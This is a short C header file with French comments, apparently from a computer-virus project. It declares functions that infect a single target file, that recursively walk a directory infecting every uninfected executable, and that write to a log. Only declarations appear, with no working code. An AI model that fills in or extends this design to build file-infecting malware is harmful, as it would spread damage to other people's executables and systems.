//
// Created by armotik on 24/03/25.
//

#ifndef INFECTION_H
#define INFECTION_H

#define MAX_PATH_LEN 1024

// Infecte un seul fichier cible donné
int infecter_fichier(const char *cible, const char *chemin_virus);

// Explore un dossier récursivement et infecte tous les fichiers exécutables non infectés
void explorer_et_infecter(const char *path, const char *chemin_virus);

// Fonction pour écrire un message dans le fichier de log
void ecrire_log(const char *message);

#endif // INFECTION_H
